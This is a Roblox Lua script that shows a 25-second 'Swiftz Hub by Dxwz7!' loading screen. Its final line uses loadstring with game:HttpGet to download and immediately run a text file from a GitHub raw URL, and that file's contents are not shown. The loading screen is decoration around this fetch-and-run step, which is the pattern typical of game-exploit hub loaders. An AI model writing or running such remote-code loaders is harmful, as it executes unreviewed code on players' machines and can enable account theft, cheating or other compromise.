local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SwiftzLoading"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Background Frame
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.Parent = screenGui

-- Title Text
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0.15, 0)
title.Position = UDim2.new(0, 0, 0.43, 0)
title.BackgroundTransparency = 1
title.Text = "Swiftz Hub by Dxwz7!"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.FredokaOne
title.TextScaled = true
title.Parent = bg

-- Animate Loading for 25 seconds
local duration = 25
local startTime = tick()

RunService.RenderStepped:Connect(function()
	local elapsed = tick() - startTime
	local progress = math.clamp(elapsed / duration, 0, 1)
	title.TextTransparency = 1 - progress
end)

task.wait(duration)

-- Fade out UI
TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()

task.wait(1.2)
screenGui:Destroy()

-- ⏬ Run External Script
loadstring(game:HttpGet("https://raw.githubusercontent.com/Mwrtin/Wow/refs/heads/main/ee0a8186b86e65dc8d66206d9045e89e%20(1).txt"))()
